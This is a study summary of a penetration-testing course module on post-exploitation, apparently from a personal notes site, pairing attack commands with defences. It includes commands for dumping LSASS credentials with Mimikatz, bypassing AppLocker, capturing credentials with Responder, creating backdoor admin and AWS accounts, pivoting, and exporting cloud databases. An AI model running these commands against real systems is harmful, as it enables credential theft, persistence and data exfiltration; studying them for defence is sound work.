---
title: Post-Exploitation and Evasion Techniques - SEC504.5
parent: SEC504
grand_parent: SANS
great_grand_parent: Categories
nav_order: 5
layout: default
---

# Post-Exploitation and Evasion Techniques (Inspired by SANS SEC504.5)

This writeup distills post-exploitation insights from SEC504.5, providing a restructured and accessible summary for educational purposes. It emphasizes attacker movement, endpoint evasion, persistence, cloud attacks, and modern defensive tactics.

---

## Attacker Objectives After Initial Compromise

Once access is gained, attackers face new challenges and opportunities:

* **Challenges**: EDR, monitoring tools, logging, and AV/NGAV.
* **Opportunities**:

  * Lateral movement
  * Internal network enumeration
  * Credential and data harvesting

---

## Endpoint Evasion Techniques

### Malware Execution Tactics

* Modify malware to avoid AV/EDR signatures
* Encode or obfuscate binaries
* Use trusted, signed, or built-in tools to execute malicious actions (Living off the Land / LOL)

### Application Allowlisting (AppLocker, etc.)

* Allowlisting restricts programs to known-safe apps by hash, signer, or path
* AppLocker, WDAC, or third-party allowlist tools are standard defenses

### Bypassing AppLocker

```powershell
InstallUtil /U payload.exe  # Executes code under the radar
```

### LOLBAS Project

* A community-driven list of legitimate binaries that can be used maliciously
* [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

### Dumping Credentials with Mimikatz

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

### Linux Privilege Escalation

* `sudo -l`
* `find / -perm -4000 -uid 0`
* `grep -iR password /var/www`
* Inspect `.history`, `.ssh`, credentials in source files

### Defensive Tactics

* Use strong EDR + behavioral analytics (UEBA)
* Monitor denied executions
* Harden allowlisting rules with strong change control

---

## Lateral Movement and Pivoting

### Using Meterpreter

```bash
portfwd add -l 8000 -r 10.10.10.100 -p 80
route add 10.10.10.0/24 1
```

### Host and Service Discovery

```bash
run arp_scanner -r 10.10.10.0/24
use auxiliary/scanner/portscan/tcp
set PORTS 22,80,443
```

### SSH and netsh Port Forwarding

```bash
ssh -L 8000:10.10.10.100:80 user@pivot
netsh interface portproxy add v4tov4 listenport=8000 connectport=80 connectaddress=10.10.10.100
```

---

## Protocol Hijacking on Internal Networks

### Responder

```bash
sudo responder -I eth0
```

* Exploits LLMNR, NetBIOS, MDNS for credential theft

### Defense

* Disable LLMNR and NBT-NS via GPO
* Disable legacy SMB (< v3.1.1)
* Use firewall rules to prevent broadcast name resolution

---

## Persistence Mechanisms

### Techniques

* Create new accounts

```powershell
net user /add backdoor Pass123
net localgroup administrators backdoor /add
```

* Use Metasploit’s persistence modules

```bash
use exploit/windows/local/wmi_persistence
```

* Golden Ticket (Kerberos persistence via krbtgt hash)
* Web shells in hidden files or compromised content

### Cloud Persistence (AWS)

```bash
aws iam list-users
aws iam create-access-key --user-name backdoor
```

### Defensive Strategies

* Monitor for logon/logoff (4624/4634), priv use (4672), new accounts (4720)
* Detect anomalous registry entries and startup programs
* Use tools like Autoruns or EDRs

---

## Network-Based C2 Detection: RITA

### Behavioral Detection

* Long-lived sessions
* Regular packet size/intervals (heartbeat)
* High skew consistency

### RITA Setup

```bash
zeek -Cr capture.pcap
rita import . mynetwork
rita html-report mynetwork
```

### DNS + Beaconing Analysis

```bash
rita show-long-connections -H mynetwork
rita show-exploded-dns mynetwork
```

---

## Cloud Post-Exploitation

### AWS Enumeration

```bash
aws sts get-caller-identity
aws ec2 describe-instances
aws s3 ls
```

### GCP SQL Exfiltration

```bash
gsutil mb gs://bucketname
gcloud sql export sql db --database dbname gs://bucketname/sqldump.gz
gsutil cp gs://bucketname/sqldump.gz .
```

### Microsoft 365 Compliance Search

* Search across Teams, Outlook, OneDrive, SharePoint for keywords
* Requires membership in eDiscovery Manager role

### Tools

* **Pacu**: Modular AWS exploitation tool

```bash
./cli.py
> import_keys creds
> run iam__enum_permissions
```

* **CloudMapper**, **ScoutSuite** for cloud config review

### Logging Tips

* Centralize logs to another account/project
* Log API failures and sensitive access attempts
* Monitor IAM changes and privilege escalations

---

## Where to Go from Here: Memory & Review

### Spaced Repetition

* Use **Anki** or similar tools
* Revisit material 1, 2, 7, and 14 days out

### Retention Insight

* You’ll forget 50–80% in 24 hours without review
* Each review reinforces memory with less effort

---

## Summary

This module emphasizes how attackers maintain, escalate, and hide their access after compromise. Whether through AppLocker evasion, pivoting, web shells, or cloud IAM abuse, defenders must deploy layered logging, behavioral analytics, and access hygiene to detect and respond effectively.

*This content is based on personal study of SANS SEC504.5 and is rephrased for educational purposes.*
